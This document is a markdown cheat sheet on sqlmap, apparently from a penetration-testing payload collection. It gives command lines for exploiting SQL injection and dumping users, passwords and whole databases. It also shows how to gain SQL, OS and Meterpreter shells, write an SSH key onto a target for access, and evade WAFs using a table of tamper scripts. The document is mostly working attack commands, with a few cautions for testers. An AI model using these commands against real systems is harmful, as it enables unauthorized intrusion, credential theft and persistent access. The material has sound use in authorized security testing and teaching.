# SQLmap

> SQLmap is a powerful tool that automates the detection and exploitation of SQL injection vulnerabilities, saving time and effort compared to manual testing. It supports a wide range of databases and injection techniques, making it versatile and effective in various scenarios. 

> Additionally, SQLmap can retrieve data, manipulate databases, and even execute commands, providing a robust set of features for penetration testers and security analysts.

> Reinventing the wheel isn't ideal because SQLmap has been rigorously developed, tested, and improved by experts. Using a reliable, community-supported tool means you benefit from established best practices and avoid the high risk of missing vulnerabilities or introducing errors in custom code.

>However you should always know how SQLmap is working, and be able to replicate it manually if necessary.


## Summary

* [Basic Arguments For SQLmap](#basic-arguments-for-sqlmap)
* [Load A Request File](#load-a-request-file)
* [Custom Injection Point](#custom-injection-point)
* [Second Order Injection](#second-order-injection)
* [Getting A Shell](#getting-a-shell)
* [Crawl And Auto-Exploit](#crawl-and-auto-exploit)
* [Proxy Configuration For SQLmap](#proxy-configuration-for-sqlmap)
* [Injection Tampering](#injection-tampering)
    * [Suffix And Prefix](#suffix-and-prefix)
    * [Tamper Scripts](#tamper-scripts)
* [Reduce Requests Number](#reduce-requests-number)
* [SQLmap Without SQL Injection](#sqlmap-without-sql-injection)
* [References](#references)


## Basic Arguments For SQLmap

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```


## Load A Request File

A request file in SQLmap is a saved HTTP request that SQLmap reads and uses to perform SQL injection testing. This file allows you to provide a complete and custom HTTP request, which SQLmap can use to target more complex applications.

```powershell
sqlmap -r request.txt
```


## Custom Injection Point

A custom injection point in SQLmap allows you to specify exactly where and how SQLmap should attempt to inject payloads into a request. This is useful when dealing with more complex or non-standard injection scenarios that SQLmap may not detect automatically.

By defining a custom injection point with the wildcard character '`*`' , you have finer control over the testing process, ensuring SQLmap targets specific parts of the request you suspect to be vulnerable.

```powershell
python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
```


## Second Order Injection

A second-order SQL injection occurs when malicious SQL code injected into an application is not executed immediately but is instead stored in the database and later used in another SQL query. 

```powershell
sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```


## Getting A Shell

* SQL Shell: 
    ```ps1
    python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell
    ```

* OS Shell: 
    ```ps1
    python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
    ```
    
* Meterpreter: 
    ```ps1
    python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
    ```

* SSH Shell: 
    ```ps1
    python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
    ```


## Crawl And Auto-Exploit

This method is not advisable for penetration testing; it should only be used in controlled environments or challenges. It will crawl the entire website and automatically submit forms, which may lead to unintended requests being sent to sensitive features like "delete" or "destroy" endpoints.

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```

* `--batch` = Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
* `--crawl` = How deep you want to crawl a site
* `--forms` = Parse and test forms


## Proxy Configuration For SQLmap

To run SQLmap with a proxy, you can use the `--proxy` option followed by the proxy URL. SQLmap supports various types of proxies such as HTTP, HTTPS, SOCKS4, and SOCKS5.

```powershell
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://www.target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
```

* HTTP Proxy:
    ```ps1
    --proxy="http://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="http://user:pass@127.0.0.1:8080"
    ```
* SOCKS Proxy:
    ```ps1
    --proxy="socks4://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="socks4://user:pass@127.0.0.1:1080"
    ```

* SOCKS5 Proxy:
    ```ps1
    --proxy="socks5://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="socks5://user:pass@127.0.0.1:1080"
    ```


## Injection Tampering

In SQLmap, tampering can help you adjust the injection in specific ways required to bypass web application firewalls (WAFs) or custom sanitization mechanisms. SQLmap provides various options and techniques to tamper with the payloads being used for SQL injection.

### Suffix And Prefix

```powershell
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```

* `--suffix=SUFFIX`: Injection payload suffix string
* `--prefix=PREFIX`: Injection payload prefix string


### Tamper Scripts

A tamper script  is a script that modifies the SQL injection payloads to evade detection by WAFs or other security mechanisms. SQLmap comes with a variety of pre-built tamper scripts that can be used to automatically adjust payloads

```powershell
sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=space2comment
```

| Tamper | Description |
| --- | --- |
|0x2char.py | Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),…) counterpart |
|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
|apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart|
|appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
|base64encode.py | Base64 all characters in a given payload  |
|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |
|bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |
|chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |
|charencode.py | URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54) |
|charunicodeencode.py | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054) |
|charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054) |
|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|
|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|
|commentbeforeparentheses.py | Prepends (inline) comment before parentheses (e.g. ( -> /**/() |
|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
|charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
|equaltolike.py | Replaces all occurrences of operator equal ('=') with operator 'LIKE'  |
|escapequotes.py | Slash escape quotes (' and ") |
|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
|halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
|htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -> &#39;) |
|ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart| 
|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
|informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier |
|least.py | Replaces greater than operator (‘>’) with ‘LEAST’ counterpart |
|lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -> select) |
|modsecurityversioned.py | Embraces complete query with versioned comment |
|modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
|multiplespaces.py | Adds multiple spaces around SQL keywords |
|nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters|
|overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
|overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |
|percentage.py | Adds a percentage sign ('%') infront of each character  |
|plus2concat.py | Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart |
|plus2fnconcat.py | Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart |
|randomcase.py | Replaces each keyword character with random case value |
|randomcomments.py | Add random comments to SQL keywords|
|securesphere.py | Appends special crafted string |
|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |
|space2comment.py | Replaces space character (' ') with comments |
|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n') |
|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n') |
|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') |
|space2plus.py |  Replaces space character (' ') with plus ('+')  |
|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and ||) |
|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
|uppercase.py | Replaces each keyword character with upper case value 'INSERT'|
|varnish.py | Append a HTTP header 'X-originating-IP' |
|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
|versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For' |


## Reduce Requests Number

The parameter `--test-filter` is helpful when you want to focus on specific types of SQL injection techniques or payloads. Instead of testing the full range of payloads that SQLMap has, you can limit it to those that match a certain pattern, making the process more efficient, especially on large or slow web applications.

```ps1
sqlmap -u "https://www.target.com/page.php?category=demo" -p category --test-filter="Generic UNION query (NULL)"
sqlmap -u "https://www.target.com/page.php?category=demo" --test-filter="boolean"
```

By default, SQLmap runs with level 1 and risk 1, which generates fewer requests. Increasing these values without a purpose may lead to a larger number of tests that are time-consuming and unnecessary. 

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --level=1 --risk=1
```

Use the `--technique` option to specify the types of SQL injection techniques to test for, rather than testing all possible ones.

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --technique=B
```


## SQLmap Without SQL Injection

Using SQLmap without exploiting SQL injection vulnerabilities can still be useful for various legitimate purposes, particularly in security assessments, database management, and application testing. 

You can use SQLmap to access a database via its port instead of a URL.

```ps1
sqlmap.py -d "mysql://user:pass@ip/database" --dump-all
```


## References

- [#SQLmap protip - @zh4ck - March 10, 2018](https://twitter.com/zh4ck/status/972441560875970560)
- [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper - Mehmet Ince - August 1, 2017](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)